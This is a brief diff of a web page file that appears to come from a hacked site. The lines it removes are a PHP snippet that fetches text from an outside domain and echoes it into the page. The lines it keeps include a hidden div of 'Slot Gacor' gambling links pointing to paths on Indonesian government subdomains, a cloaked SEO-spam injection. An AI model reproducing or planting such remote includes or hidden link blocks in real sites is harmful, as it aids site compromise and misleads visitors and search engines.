@@ -1,6 +1,5 @@
 <!-- cek -->
-<?php $a = file_get_contents('https://luzlunatarotista.com/.tmb/-/tes.txt');
-echo $a; ?>
+
 <div style="display: none;">
 <li><a title="Slot Gacor" href="https://aisitaru.pekalongankab.go.id/plugins/-/slot-gacor/" rel="dofollow">Slot Gacor</a></li>
 <li><a title="Slot Gacor" href="https://simparta.pekalongankota.go.id/ue-scroll/src/-/slot-gacor/" rel="dofollow">Slot Gacor</a></li>
